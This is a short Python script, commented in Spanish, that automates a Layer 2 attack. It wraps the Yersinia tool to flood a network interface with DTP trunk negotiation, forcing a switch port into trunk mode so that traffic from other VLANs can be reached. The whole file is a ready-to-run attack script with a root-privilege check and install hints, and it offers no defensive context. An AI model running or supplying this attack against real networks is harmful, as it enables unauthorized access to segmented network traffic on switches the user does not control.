#!/usr/bin/env python3

import os
import sys
import subprocess
import time

INTERFACE = "eth0"

def verificar_privilegios():
    """Asegura que el script se ejecute con permisos de root"""
    if os.getuid() != 0:
        print("[-] Error: Este script requiere privilegios de administrador.")
        print(f"[*] Intenta ejecutarlo usando: sudo python3 {sys.argv[0]}")
        sys.exit(1)

def ejecutar_ataque_yersinia():
    verificar_privilegios()
    
    print(f"[*] Iniciando automatización de ataque de Capa 2...")
    print(f"[*] Convocando a Yersinia para atacar la interfaz {INTERFACE}...")
    
    # Construcción del comando nativo de Yersinia
    # dtp -> módulo del protocolo
    # -attack 1 -> ataque tipo 'Enable Trunking'
    # -interface -> puerto físico de salida
    comando = ["yersinia", "dtp", "-attack", "1", "-interface", INTERFACE]
    
    try:
        print("[+] Inyectando ráfaga de negociación DTP (Modo Desirable/Trunk)...")
        
        # Ejecutamos el subproceso de forma transparente en el fondo
        process = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Dejamos que el ataque corra durante unos segundos para estabilizar la negociación
        print("[*] Manteniendo el ataque activo para forzar la transición en el switch...")
        time.sleep(5)
        
        # Terminamos el proceso de Yersinia limpiamente
        process.terminate()
        print("[+] Ráfaga completada con éxito.")
        print("[+] Revisa el estado del puerto usando 'show interfaces trunk' en tu switch.")
        
    except FileNotFoundError:
        print("[-] Error: 'yersinia' no se encuentra instalado en este sistema.")
        print("[*] Puedes instalarlo ejecutando: sudo apt update && sudo apt install yersinia -y")
    except Exception as e:
        print(f"[-] Ocurrió un error inesperado durante la ejecución: {e}")

if __name__ == "__main__":
    ejecutar_ataque_yersinia()
